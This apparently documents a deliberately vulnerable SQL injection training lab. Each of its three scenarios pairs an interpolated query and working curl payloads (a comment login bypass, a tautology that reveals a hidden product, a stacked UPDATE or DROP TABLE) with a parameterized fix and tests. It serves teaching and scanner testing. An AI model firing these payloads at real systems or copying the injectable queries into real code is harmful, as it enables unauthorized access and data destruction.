# SQL injection scenarios (CWE-89)

All scenarios run against the in-memory PGlite instance (see [architecture.md](../architecture.md)). Every scenario has an unsafe endpoint that interpolates user input into SQL and a safe endpoint that receives the **identical payload** as a bound parameter. `POST /api/lab/reset` restores the seed data at any time.

Lab credentials: `alice / alice-lab-only`, `admin / admin-lab-only`. The login endpoints perform a demo identity check only — no session or cookie is created.

---

## SQL-001 · Login bypass

| Field | Value |
| --- | --- |
| Source | `pages/api/sql/unsafe/login.js` |
| Safe control | `pages/api/sql/safe/login.js` |
| Route / endpoint | `/sql/login` → `POST /api/sql/{unsafe,safe}/login` |
| Data flow | JSON `username`/`password` → string interpolation → `db.query` |
| Expected finding | SAST: SQL injection, CWE-89 |

### The flaw

```js
const { rows } = await db.query(
  `SELECT id, username, role FROM users WHERE username = '${username}' AND password_demo = '${password}' LIMIT 1`);
```

Both fields are spliced into the statement. The unsafe login compares against the lab-only `password_demo` column so that a classic comment payload can bypass it.

### Exploit it

```bash
curl -s http://127.0.0.1:3000/api/sql/unsafe/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin' --","password":"wrong"}'
```

Shell-safe form (recommended):

```bash
curl -s http://127.0.0.1:3000/api/sql/unsafe/login \
  -H 'Content-Type: application/json' \
  --data-raw '{"username":"admin'"'"' --","password":"wrong"}'
```

Response: `200` with `"role": "admin"` — authentication succeeded with a wrong password because `--` comments out the password check. A tautology in the password field (`' OR true --` with any username) bypasses the same way. The page `/sql/login` has buttons that load these payloads.

### Safe control

`pages/api/sql/safe/login.js` binds the username as a parameter and verifies the salted **scrypt hash**, never a stored plaintext:

```js
const { rows } = await db.query('SELECT ... WHERE username = $1', [username]);
if (!user || !verifyPassword(password, user.password_hash)) return res.status(401)...
```

Send the same bypass payload to `/api/sql/safe/login` → `401 {"authenticated":false}`. Apostrophes in legitimate usernames/passwords also work normally — evidence the protection comes from parameterization, not from rejecting quotes.

### Tests

- `tests/unit/sql.test.mjs`: valid/invalid logins on both; comment bypass and tautology bypass succeed only on unsafe; safe rejects payload in either field.
- `scripts/test-http.mjs` repeats the pair over HTTP.

---

## SQL-002 · Product search injection

| Field | Value |
| --- | --- |
| Source | `pages/api/sql/unsafe/products.js` |
| Safe control | `pages/api/sql/safe/products.js` |
| Route / endpoint | `/sql/products` → `GET /api/sql/{unsafe,safe}/products?q=` |
| Data flow | `query.q` → ILIKE pattern interpolation → `db.query` |
| Expected finding | SAST: SQL injection, CWE-89 |

### The flaw

```js
const { rows } = await db.query(
  `SELECT ... FROM products WHERE public = true AND name ILIKE '%${q}%' ORDER BY id`);
```

The intended predicate only lists public products; the interpolated term can rewrite the WHERE clause and disclose the hidden `Internal prototype` row.

### Exploit it

```bash
curl -s 'http://127.0.0.1:3000/api/sql/unsafe/products?q=%27%20OR%20true%20--'
```

That URL-decodes to `q=' OR true --`. The unsafe response lists **3** products including `Internal prototype`; the safe endpoint with the identical query returns an empty list. Normal searches (`?q=mug`) behave the same on both.

### Safe control

`pages/api/sql/safe/products.js` binds the pattern:

```js
await db.query('... WHERE public = true AND name ILIKE $1 ORDER BY id', [`%${q}%`]);
```

Note the scope of this control: parameterization defeats SQL **injection**. It is not an authorization control — which rows are *public* is a business rule the query still enforces on its own terms.

### Tests

- `tests/unit/sql.test.mjs`: 3 rows (including the private product) via unsafe, 0 rows via safe, identical baseline counts, apostrophe search works safely.
- `scripts/test-http.mjs` repeats the pair over HTTP.

---

## SQL-003 · Note write with stacked statements

| Field | Value |
| --- | --- |
| Source | `pages/api/sql/unsafe/notes.js` |
| Safe control | `pages/api/sql/safe/notes.js` |
| Route / endpoint | `/sql/notes` → `GET/POST /api/sql/{unsafe,safe}/notes` |
| Data flow | JSON `body` → interpolation → `db.exec` (multi-statement) |
| Expected finding | SAST: SQL injection, CWE-89 |

### The flaw

```js
const results = await db.exec(
  `INSERT INTO notes (body, visibility) VALUES ('${body}', 'public') RETURNING ...`);
```

`db.exec` executes **multiple statements**, so the note text can close the INSERT and append a second statement — an UPDATE, a DELETE, or even `DROP TABLE`.

### Exploit it

```bash
curl -s http://127.0.0.1:3000/api/sql/unsafe/notes \
  -H 'Content-Type: application/json' \
  -d '{"body":"lab'"'"', '"'"'public'"'"'); UPDATE products SET public = true; --"}'
```

The note is stored *and* the stacked `UPDATE` publishes every product. Verify with `GET /api/sql/safe/products` — now 3 rows. Then repair with `POST /api/lab/reset`. (A `DROP TABLE notes` payload works identically and demonstrates destructive stacked SQL; reset recovers the schema too.)

### Safe control

`pages/api/sql/safe/notes.js` uses a parameterized single-statement INSERT:

```js
await db.query('INSERT INTO notes (body, visibility) VALUES ($1, $2) RETURNING ...', [body, 'public']);
```

Post the identical payload to `/api/sql/safe/notes` → `201`, and the note body is stored **verbatim** (verify via `GET /api/sql/safe/notes`); the product table is untouched.

### Tests

- `tests/unit/sql.test.mjs`: stacked mutation flips product visibility only through the unsafe write; the safe write stores the attack string literally; ordinary notes and apostrophes round-trip on both; reset restores schema after a `DROP TABLE`.
- `scripts/test-http.mjs` repeats the scenario end-to-end over HTTP.
